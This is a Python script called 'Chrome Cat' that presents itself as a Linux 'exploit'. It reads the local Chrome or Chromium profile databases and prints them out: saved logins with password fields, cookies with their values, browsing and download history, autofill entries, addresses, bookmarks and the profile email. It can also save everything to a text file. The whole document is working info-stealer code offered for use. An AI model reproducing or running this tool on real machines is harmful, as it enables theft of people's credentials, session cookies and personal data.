#! /usr/bin/python3
################################################################################
#   ____ _  _ ____ ____ _  _ ____ ____ ____ ___                                #
#   |    |__| |__/ |  | |\/| |___ |    |__|  |                                 #  
#   |___ |  | |  \ |__| |  | |___ |___ |  |  |                                 #
#                                                                              #
#                                                                              #
#                                                                              #
# DATE                                                                         #
# 10/12/2019                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# Chrome Cat pulls/extracts all sensitive                                      #
# information from the Chrome browser                                          #
#                                                                              #
# REQUREMENTS                                                                  #
# - Python 3                                                                   #
# - Linux System                                                               #
#                                                                              #
################################################################################

import os 
import sys

try:
    import sqlite3
except ImportError:
    print("[!!!] Error import 'sqlite3' model")
    exit()
    
try:
    import json
except ImportError:
    print("[!!!] Error import 'json' model")
    exit()


R = '\033[1;31m'
T = '\033[1;33m'
B = '\033[1;34m'
G = '\033[1;32m'
W = '\033[1;37m'
U = '\033[1;4m'
F = '\033[1;7m'
N = '\033[0m'

HELP = []

#######################
#   Input Forms
#######################  
def formProfiles(*args, **kwargs):
    # connect with database
    db = get('Web Data')
    conSqlite3 = sqlite3.connect(db)
    
    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `autofill_profiles` ORDER BY "
    +"`guid` ASC LIMIT 0, 50000")

    # get list
    reaSqlite3 = wriSqlite3.fetchall()


    for _, _,name,add,local, city, state, zipcode, _, country,*_ in reaSqlite3:
        add = add.replace('\n', ' ')

        echo(f"{stars(1) if name != '' else stars(2)}name: {name}\n{stars(1) if add != '' else stars(2)}address: {add[0:50]+ '...' if len(add) > 50 else add}\n"+
             f"{stars(1) if local != '' else stars(2)}local: {local}\n{stars(1) if city != '' else stars(2)}city: {city}\n{stars(1) if state != '' else stars(2)}state: {state}\n{stars(1) if zipcode != '' else stars(2)}"+
             f"zipcode: {zipcode}\n{stars(1) if country != '' else stars(2)}country : {country}\n")
        
        HELP.append([f"{'='*20}\n{name}", add,local, city, state, zipcode, country])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)
    

#######################
#      Inputs Text
#######################
def formInputText(*args, **kwargs):
    # connect with database
    db = get('Web Data')
    conSqlite3 = sqlite3.connect(db)
    
    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `autofill` ORDER BY"
    + "`value` ASC LIMIT 0, 50000;")

    # get list
    reaSqlite3 = wriSqlite3.fetchall()


    for _,_,value,*_ in reaSqlite3:
        echo(f"{stars(1) if value != '' else stars(2)}Value: "+
             f"{value[0:50]+ '...' if len(value) > 50 else value } \n")
        
        HELP.append([f"{'='*20}\n{value}"])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)
        

#######################
#       Top Sites
#######################        
def topSite(*args, **kwargs):
    # connect with database
    db = get('Top Sites')
    conSqlite3 = sqlite3.connect(db)
    
    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `top_sites` ORDER BY"
    + " `url_rank` ASC LIMIT 0, 50000;")

    # get list
    reaSqlite3 = wriSqlite3.fetchall()


    for _, url, Id, title, _ in reaSqlite3:
        echo(f"{stars(1) if Id != '' else stars(2)}number: "+
             f"{Id+1}\n{stars(1) if title != '' else stars(2)}title : "+
             f"{title[0:50]+ '...' if len(title) > 50 else title }\n"+
             f"{stars(1) if url != '' else stars(2)}url   : "+
             f"{url[0:50]+ '...' if len(url) > 50 else url } \n")
        
        HELP.append([f"{'='*20}\n{Id+1}", title, url])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)
  
    
#######################
# History Downlods
#######################
def historyDownlods(*args, **kwargs):
    # connect with database
    db = get('History')
    conSqlite3 = sqlite3.connect(db)
    
    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `downloads_url_chains`"
    + " ORDER BY `url` ASC LIMIT 0, 50000;")

    # get list
    reaSqlite3 = wriSqlite3.fetchall()

    for *_, url in reaSqlite3:
        echo(f"{stars(1) if url != '' else stars(2)}url : "+
             f"{url[0:50]+ '...' if len(url) > 50 else url } \n")
        
        HELP.append([f"{'='*20}\n{url}"])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)


#######################
#    History Urls 
#######################
def historyUrl(*args, **kwargs):
    # connect with database
    db = get('History')
    conSqlite3 = sqlite3.connect(db)

    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `urls` ORDER BY "
    + "`id` ASC LIMIT 0, 50000;")

    # get list
    reaSqlite3 = wriSqlite3.fetchall()
    

    for _,_, url, title,*_ in reaSqlite3:
        echo(f"{stars(1) if title != '' else stars(2)}title : "+
             f"{title[0:50]+ '...' if len(title) > 50 else title }\n"+
             f"{stars(1) if url != '' else stars(2)}url: "+
             f"{url[0:50]+'...' if len(url) > 50 else url}\n")
        
        HELP.append([f"{'='*20}\n{title}", url])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)


#######################
#       Cookies
#######################
def cookies(*args, **kwargs):
    # connect with database
    db = get('Cookies')
    conSqlite3 = sqlite3.connect(db)

    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `cookies` ORDER BY"
    + " `_rowid_` ASC LIMIT 0, 50000;")
    
    # get list
    reaSqlite3 = wriSqlite3.fetchall()
    
    for _, _, url, name, _, path, *_ , value,_ in reaSqlite3:
        echo(f"{stars(1) if url != '' else stars(2)}Url : "+
             f"{url} \n{stars(1) if name != '' else stars(2)}name: "+
             f"{name}\n{stars(1) if path != '' else stars(2)}path: "+
             f"{path}\n{stars(1) if value!= '' else stars(2)}value: {value}\n")
        
        HELP.append([f"{'='*20}\n{url}", name,path, value])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)


#######################
#       Logins
#######################
def loginData(*args, **kwargs):
    # connect with database
    db = get('Login Data')
    conSqlite3 = sqlite3.connect(db)

    # selected database 
    wriSqlite3 = conSqlite3.execute("SELECT `_rowid_`,* FROM `logins` "
    + "ORDER BY `_rowid_` ASC LIMIT 0, 50000;")

    # get list
    reaSqlite3 = wriSqlite3.fetchall()
    
    for _,url, _, _, user, _, password, *_ in reaSqlite3:
        # if user != '' and password != b'':
        echo(f"{stars(1) if url != '' else stars(2)}Url : "+
             f"{url} \n{stars(1) if user != '' else stars(2)}User: "+
             f"{user}\n{stars(1) if password != b'' else stars(2)}pass: {password}\n")

        HELP.append([f"{'='*20}\n{url}", user,password])
    
    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)


#######################
#       Bookmarks
#######################
def Bookmarks(*args, **kwargs):
    db = get('Bookmarks')
    conjson = json.loads(open(db).read())

    reajson = conjson['roots']['bookmark_bar']['children']

    for  value in reajson:
        
        try:
            echo(f"{stars(1) if value['name'] != '' else stars(2)}{value['name']}\n"+
                 f"{stars(1) if value['url'] != '' else stars(2)}{value['url']}\n")
            HELP.append([f"{'='*20}\n{value['name']}",value['url']])

        except:
            continue


    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)


#######################
#       Profile
#######################
def Profile(*args, **kwargs):
    db = get('Local State')
    conjson = json.loads(open(db).read())

    reajson = conjson['profile']['info_cache']['Default']
    
    USE = ['name', 'user_name']
    
    try:
        echo(f"{stars(1) if reajson[USE[0]] != '' else stars(2)}User Name: {reajson[USE[0]]}\n"+
             f"{stars(1) if reajson[USE[1]] != '' else stars(2)}Email    : {reajson[USE[1]]}\n")
    
        HELP.append([f"{'='*20}\n{reajson[USE[0]]}",reajson[USE[1]]])

    except:
        pass

    if args[0] != False:
        ascMe = yesave()
        if ascMe[0]  == True:
            save(ascMe[1], HELP)


########################################################################
def get(*args, **kwargs):
    PATH = ''
    G3 = ['google-chrome','chromium']
    G2 = '.config'
    G1 = 'Default'

    for i in G3:
        try:
            PATH = os.path.join(os.environ.get("HOME"), G2, i, G1 if args[0] != 'Local State' else '')
            os.open(PATH,0)
            break
        
        except FileNotFoundError:
            pass

    if PATH == '':
        echo(f"{stars(4)} No find google chrome ")
        exit()
        
    return os.path.join(PATH, args[0])


########################################################################
def stars(*args, **kwargs):
    if 0x01 in args:
        return  f'[ {G}+{N} ] '
    
    elif 0x02 in args:
        return  f'[ {R}-{N} ] '
    
    elif 0x03 in args:
        return  f'[ {B}*{N} ] '
    
    elif 0x04 in args:
        return  f'[ {R}!{N} ] '
    
    elif 0x05 in args:
        return f'[ Y/N ]'

    else:
        return f'[ {T}{args[0]}{N} ] '


########################################################################
def echo(*args, **kwargs) :
    return print(args[0])


########################################################################
def index():
    if sys.platform != 'linux':
        echo(f"{stars(4)} This explit for linux")
        exit()

    sp = ' '*3
    sm = f"""{G}{sp}____ _  _ ____ ____ _  _ ____ ____ ____ ___ 
{sp}|    |__| |__/ |  | |\/| |___ |    |__|  |  
{sp}|___ |  | |  \ |__| |  | |___ |___ |  |  |  
 
{N}                                                                       
    {stars('1')}Profile
    {stars('2')}Bookmarks
    {stars('3')}Login Data
    {stars('4')}Cookies Data
    {stars('5')}History Urls Data
    {stars('6')}History Downlods Data
    {stars('7')}Input Text Data
    {stars('8')}Inputs Forms Data
    {stars('9')}Top Site Data
    {stars('0')}All
"""
    return echo(sm)
    
    
########################################################################
def yesave():
    n1 = input(f"{stars(3)}Are you wont save this {stars(5)}: ")
    if n1 == '':
        echo(f"{stars(4)}Error input")
        exit()

    elif n1[0].upper() == 'Y':
        n2 = input(f"{stars(3)}Enter the name save file default(google_out.txt):{stars(5)}: ")
        if n2 == '':
            file = 'google_out.txt'
        else:
            file = n2
        return [True, file]

    else:
        return [False]
        

########################################################################
def save(*args, **kwargs):
    with open(args[0] , 'a') as f:
        for i in args[1]:
            for j in i:
                f.writelines(f"{j}\n") if j != '' else '' 
        

########################################################################

if __name__ == "__main__":

    if '-h' in sys.argv or '--help' in sys.argv:
        echo(f"\t{G}This exploit For Linux{N}")
        exit()
    
    index()
    start = input(f"{stars(3)}Use > ")
    
    try:
        if start == '':
            echo(f"{stars(4)}Error input")

        elif start[0] == '1':   
            Profile(True)

        elif start[0] == '2':
            Bookmarks(True)

        elif start[0] == '3':
            loginData(True)

        elif start[0] == '4':
            cookies(True)

        elif start[0] == '5':
            historyUrl(True)

        elif start[0] == '6':
            historyDownlods(True)
        
        elif start[0] == '7':
            formInputText(True)

        elif start[0] == '8':
            formProfiles(True)
        
        elif start[0] == '9':
            topSite(True)

        elif start[0] == '0':
            Profile(False);Bookmarks(False);loginData(False);cookies(False);historyUrl(False)
            historyDownlods(False);formInputText(False);formProfiles(False);topSite(False)
            
            ascMe = yesave()
            if ascMe[0]  == True:save(ascMe[1], HELP)
        
        else:
            echo(f"{stars(4)}Error input")
            exit()

    except sqlite3.OperationalError:
        echo(f"{stars(4)}The Google Chrome Is Clean Or No Find Files The Google Chrome.")
    
    echo(f"{stars(1)}Thank You For Use Me.")
